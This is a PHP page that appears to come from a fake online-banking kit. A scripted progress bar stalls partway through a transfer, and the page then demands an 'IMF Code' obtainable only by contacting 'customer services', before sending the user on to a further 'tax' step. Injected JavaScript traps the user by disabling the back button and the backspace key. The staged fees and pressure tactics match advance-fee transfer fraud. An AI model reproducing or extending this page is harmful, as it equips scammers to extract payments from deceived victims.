<?php 
include 'includes/header.php';

if(!isset($_SESSION['imf'])){
    
    header("Location: dashboard");

    exit(); 
}

if (isset($_POST['submitCot'])) {

    $imf = trim($_POST['imf']);
    $imf = strip_tags($imf);
    $imf = htmlspecialchars($imf);

    if ($imf !== $row['imf']) {
        echo("<script>location.href = 'intl-transfer?imferror';</script>");
        //$reg_user->redirect("intl-transfer?coterror");
    } else{

        unset($_SESSION['imf']);

        $_SESSION['tax'] = "true";
        $reg_user->redirect("tax");
    }
}

include 'includes/html.php';
?>
<script type="text/javascript">
        (function (global) {

        if(typeof (global) === "undefined")
        {
            throw new Error("window is undefined");
        }

        var _hash = "!";
        var noBackPlease = function () {
            global.location.href += "#";

            // making sure we have the fruit available for juice....
            // 50 milliseconds for just once do not cost much (^__^)
            global.setTimeout(function () {
                global.location.href += "!";
            }, 50);
        };
        
        // Earlier we had setInerval here....
        global.onhashchange = function () {
            if (global.location.hash !== _hash) {
                global.location.hash = _hash;
            }
        };

        global.onload = function () {
            
            noBackPlease();

            // disables backspace on page except on input fields and textarea..
            document.body.onkeydown = function (e) {
                var elm = e.target.nodeName.toLowerCase();
                if (e.which === 8 && (elm !== 'input' && elm  !== 'textarea')) {
                    e.preventDefault();
                }
                // stopping event bubbling up the DOM tree..
                e.stopPropagation();
            };
            
        };

        })(window);
    </script>

<script>
    var counter = 35;
    var c = 35;
    var i = setInterval(function () {
      $(".loading-page .counter h1").html(c + "%");
      $(".loading-page .counter hr").css("width", c + "%");

      counter++;
      c++;

      if (counter == 43) {
        clearInterval(i);

        var loader = document.getElementById("myname");
        loader.style.display = 'none';

        var cott = document.getElementById("cot");
        cott.style.display = 'block';
    }
}, 400);

</script>
<style>
    @import url(https://fonts.googleapis.com/css?family=Roboto:400,900italic,900,700italic,700,500italic,500,400italic,300italic,300,100italic,100);
    * {
      box-sizing: border-box;
      margin: 0;
  }

  h1, p, h2, h3, h4, ul, li, div {
      margin: 0;
      padding: 0;
  }

/*body {
  padding: 0;
  width: 100vw;
  height: 100vh;
  overflow: hidden;
  display: -webkit-box;
  display: flex;
  font-family: Roboto;
}*/

.loading-page {
  background: #0d0d0d;
  /*width: 100vw;*/
  /*height: 100vh;*/
  display: -webkit-box;
  display: flex;
  -webkit-box-pack: center;
  justify-content: center;
  -webkit-box-align: center;
  align-items: center;
}
.loading-page .counter {
  text-align: center;
}
.loading-page .counter p {
  font-size: 25px;
  font-weight: 100;
  color: #f60d54;
}
.loading-page .counter h1 {
  color: white;
  font-size: 30px;
  margin-top: -10px;
}
.loading-page .counter hr {
  background: #f60d54;
  border: none;
  height: 1px;
}
.loading-page .counter {
  position: relative;
  width: 200px;
}
.loading-page .counter h1.abs {
  position: absolute;
  top: 0;
  width: 100%;
}
.loading-page .counter .color {
  width: 0px;
  overflow: hidden;
  color: #f60d54;
}

</style> 

<div class="loading-page" id="myname">
  <div class="counter">
    <p>Transfer Progress</p>
    <h1>35%</h1>
    <hr/>
</div>
</div>

<div id="cot" style="display: none;">
    <ul class="body-tabs body-tabs-layout tabs-animated body-tabs-animated nav">
        <a role="tab" class="nav-link active" id="tab-0" data-toggle="tab" href="#tab-content-0">
            <span><i class='fas fa-money-check-alt' style='font-size:24px;color:orange'></i> International Monetary Fund (IMF)</span>
        </a>
    </li> 
</ul>                   

<div class="tab-content">
    <div class="form-desc" style="color:#05194B; text-align:justify;">
       <?php echo $row['imfmsg']; ?>
   </div>
   <br>

   <div class="tab-pane tabs-animation fade show active" id="tab-content-0" role="tabpanel">
    <div class="main-card mb-3 card">
        <div class="card-body">





         <p>Bank Name: <?php echo $_SESSION['rbname']; ?></p>
         <p>Bank Account: <?php echo $_SESSION['accno']; ?></p>


         <label>Contact Customer services via <a class="btn btn-primary" href="mailto:<?php echo $siteemail; ?>"><?php echo $siteemail; ?></a>
         for your IMF Code</label>


         <form action="#" method="POST" enctype="multipart/form-data" />





         <div class="position-relative form-group"><label for="exampleAddress" class="">IMF Code</label>
            <input name="imf"  style="height:80px;"  type="text" class="form-control" required=""></div>




            <!-- <input type="hidden" name="rbname" value="Kodak "/>
            <input type="hidden" name="accno" value="0012457896 "/>
            <input type="hidden" name="bname" value="Mich Clerk "/>
            <input type="hidden" name="rcountry" value=" "/>
            <input type="hidden" name="rstate" value="Mar "/>
            <input type="hidden" name="bemailadd" value="kingscloud@hi2.in "/>
            <input type="hidden" name="swift" value="86356874458 "/>
            <input type="hidden" name="dot" value="07:51 PM 11 May 2022 "/>
            <input type="hidden" name="amt" value="1000 "/>
            <input type="hidden" name="toption" value="IT "/>
            <input type="hidden" name="desc" value="Funds Transfer "/>
            <input type="hidden" name="saccno" value="4668345056 "/> -->
            
            <div class="card card-bordered text-muted p-2">We have security measures in place to safeguard your money, because we are committed to providing you with a secure banking experience.</div>

            <button  id="submitButton" type="submit" name="submitCot" class="mt-2 btn btn-primary">
                <i class='fas fa-money-check-alt' style='font-size:24px;color:orange'></i>&nbsp;
                Validate IMF ></button>
            </form>
        </div>
    </div>

</div>

</div>

</div>


<?php include 'includes/footer.php'; ?>  